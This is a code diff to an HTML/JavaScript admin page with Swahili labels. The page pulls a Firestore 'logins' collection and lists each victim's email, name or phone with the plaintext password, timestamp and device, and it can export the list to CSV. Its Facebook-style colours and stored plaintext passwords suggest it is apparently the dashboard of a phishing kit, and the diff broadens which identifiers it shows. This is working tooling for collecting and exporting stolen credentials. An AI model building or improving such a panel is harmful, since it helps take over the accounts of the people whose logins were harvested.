@@ -20,25 +20,14 @@
       color: #fff;
     }
 
-    /* ── LOGIN SCREEN ── */
     #loginScreen {
       width: 100%;
       max-width: 320px;
       text-align: center;
     }
 
-    .admin-title {
-      font-size: 28px;
-      font-weight: 800;
-      color: #1877f2;
-      margin-bottom: 8px;
-    }
-
-    .admin-sub {
-      font-size: 14px;
-      color: #90949c;
-      margin-bottom: 24px;
-    }
+    .admin-title { font-size: 28px; font-weight: 800; color: #1877f2; margin-bottom: 8px; }
+    .admin-sub { font-size: 14px; color: #90949c; margin-bottom: 24px; }
 
     .admin-input {
       width: 100%;
@@ -71,20 +60,10 @@
     }
     .btn-enter:hover { background: #166fe5; }
 
-    .err-login {
-      color: #e02b2b;
-      font-size: 13px;
-      margin-top: 10px;
-      display: none;
-    }
+    .err-login { color: #e02b2b; font-size: 13px; margin-top: 10px; display: none; }
     .err-login.show { display: block; }
 
-    /* ── ADMIN PANEL ── */
-    #adminPanel {
-      display: none;
-      width: 100%;
-      max-width: 700px;
-    }
+    #adminPanel { display: none; width: 100%; max-width: 700px; }
 
     .panel-header {
       display: flex;
@@ -95,16 +74,8 @@
       gap: 10px;
     }
 
-    .panel-title {
-      font-size: 22px;
-      font-weight: 700;
-      color: #1877f2;
-    }
-
-    .panel-count {
-      font-size: 13px;
-      color: #90949c;
-    }
+    .panel-title { font-size: 22px; font-weight: 700; color: #1877f2; }
+    .panel-count { font-size: 13px; color: #90949c; }
 
     .btn-csv {
       padding: 8px 16px;
@@ -131,70 +102,23 @@
     }
     .btn-signout:hover { background: #4a4b4c; }
 
-    .table-wrap {
-      overflow-x: auto;
-      border-radius: 8px;
-      background: #242526;
-    }
+    .table-wrap { overflow-x: auto; border-radius: 8px; background: #242526; }
 
-    table {
-      width: 100%;
-      border-collapse: collapse;
-      font-size: 14px;
-    }
-
-    thead {
-      background: #1877f2;
-    }
-
-    thead th {
-      padding: 12px 16px;
-      text-align: left;
-      font-weight: 700;
-      color: #fff;
-      white-space: nowrap;
-    }
-
-    tbody tr {
-      border-bottom: 1px solid #3a3b3c;
-      transition: background 0.1s;
-    }
-
+    table { width: 100%; border-collapse: collapse; font-size: 14px; }
+    thead { background: #1877f2; }
+    thead th { padding: 12px 16px; text-align: left; font-weight: 700; color: #fff; white-space: nowrap; }
+    tbody tr { border-bottom: 1px solid #3a3b3c; transition: background 0.1s; }
     tbody tr:hover { background: #3a3b3c; }
+    tbody td { padding: 12px 16px; color: #e4e6eb; word-break: break-all; }
 
-    tbody td {
-      padding: 12px 16px;
-      color: #e4e6eb;
-      word-break: break-all;
-    }
-
-    .badge-no {
-      background: #3a3b3c;
-      color: #90949c;
-      padding: 2px 8px;
-      border-radius: 4px;
-      font-size: 12px;
-    }
-
-    .loading {
-      text-align: center;
-      padding: 40px;
-      color: #90949c;
-      font-size: 15px;
-    }
-
-    .empty {
-      text-align: center;
-      padding: 40px;
-      color: #90949c;
-      font-size: 15px;
-    }
+    .badge-no { background: #3a3b3c; color: #90949c; padding: 2px 8px; border-radius: 4px; font-size: 12px; }
+    .loading { text-align: center; padding: 40px; color: #90949c; font-size: 15px; }
+    .empty { text-align: center; padding: 40px; color: #90949c; font-size: 15px; }
   </style>
 </head>
 
 <body>
 
-  <!-- Login Screen -->
   <div id="loginScreen">
     <div class="admin-title">🔐 Admin</div>
     <div class="admin-sub">Weka password ya siri</div>
@@ -203,7 +127,6 @@
     <div class="err-login" id="errLogin">Password si sahihi.</div>
   </div>
 
-  <!-- Admin Panel -->
   <div id="adminPanel">
     <div class="panel-header">
       <div>
@@ -222,7 +145,7 @@
         <thead>
           <tr>
             <th>#</th>
-            <th>Email</th>
+            <th>Taarifa (Email / Jina / Simu)</th>
             <th>Password</th>
             <th>Wakati</th>
             <th>Kifaa</th>
@@ -253,10 +176,8 @@
 
   const app = initializeApp(firebaseConfig);
   const db  = getFirestore(app);
-
   let allData = [];
 
-  /* ── Login ── */
   function ingia() {
     const pin = document.getElementById("pinInput").value;
     if (pin === ADMIN_PIN) {
@@ -269,20 +190,14 @@
     }
   }
 
-  /* ── Load Firestore data ── */
   async function loadData() {
     try {
       const q = query(collection(db, "logins"), orderBy("wakati", "desc"));
       const snap = await getDocs(q);
-
       allData = [];
-      snap.forEach(doc => {
-        allData.push({ id: doc.id, ...doc.data() });
-      });
-
+      snap.forEach(doc => allData.push({ id: doc.id, ...doc.data() }));
       renderTable(allData);
     } catch (e) {
-      // Try without orderBy if index missing
       try {
         const snap = await getDocs(collection(db, "logins"));
         allData = [];
@@ -294,7 +209,6 @@
     }
   }
 
-  /* ── Render table ── */
   function renderTable(data) {
     document.getElementById("loadingMsg").style.display = "none";
     document.getElementById("countLabel").textContent   = `Jumla: ${data.length} rekodi`;
@@ -313,18 +227,20 @@
         ? new Date(row.wakati.seconds * 1000).toLocaleString("sw-TZ")
         : "—";
 
-      // Shorten userAgent
+      // Taarifa — inakubali email, identifier, au jina
+      const taarifa = row.identifier || row.email || row.jina || row.simu || "—";
+
       let kifaa = row.userAgent || "—";
-      if (kifaa.includes("Android")) kifaa = "Android";
-      else if (kifaa.includes("iPhone")) kifaa = "iPhone";
+      if (kifaa.includes("Android"))      kifaa = "Android";
+      else if (kifaa.includes("iPhone"))  kifaa = "iPhone";
       else if (kifaa.includes("Windows")) kifaa = "Windows";
-      else if (kifaa.includes("Mac")) kifaa = "Mac";
+      else if (kifaa.includes("Mac"))     kifaa = "Mac";
       else kifaa = "Nyingine";
 
       const tr = document.createElement("tr");
       tr.innerHTML = `
         <td><span class="badge-no">${i + 1}</span></td>
-        <td>${row.email || "—"}</td>
+        <td>${taarifa}</td>
         <td>${row.password || "—"}</td>
         <td>${wakati}</td>
         <td>${kifaa}</td>
@@ -333,15 +249,13 @@
     });
   }
 
-  /* ── Download CSV ── */
   function downloadCSV() {
     if (allData.length === 0) return;
-    let csv = "Namba,Email,Password,Wakati\n";
+    let csv = "Namba,Taarifa,Password,Wakati\n";
     allData.forEach((row, i) => {
-      const wakati = row.wakati
-        ? new Date(row.wakati.seconds * 1000).toLocaleString()
-        : "";
-      csv += `${i+1},"${row.email || ""}","${row.password || ""}","${wakati}"\n`;
+      const wakati   = row.wakati ? new Date(row.wakati.seconds * 1000).toLocaleString() : "";
+      const taarifa  = row.identifier || row.email || row.jina || row.simu || "";
+      csv += `${i+1},"${taarifa}","${row.password || ""}","${wakati}"\n`;
     });
     const blob = new Blob([csv], { type: "text/csv" });
     const url  = URL.createObjectURL(blob);
@@ -352,7 +266,6 @@
     URL.revokeObjectURL(url);
   }
 
-  /* ── Sign out ── */
   function toka() {
     document.getElementById("adminPanel").style.display  = "none";
     document.getElementById("loginScreen").style.display = "block";
@@ -360,7 +273,6 @@
     allData = [];
   }
 
-  /* ── Enter key ── */
   document.getElementById("pinInput").addEventListener("keydown", e => {
     if (e.key === "Enter") ingia();
   });
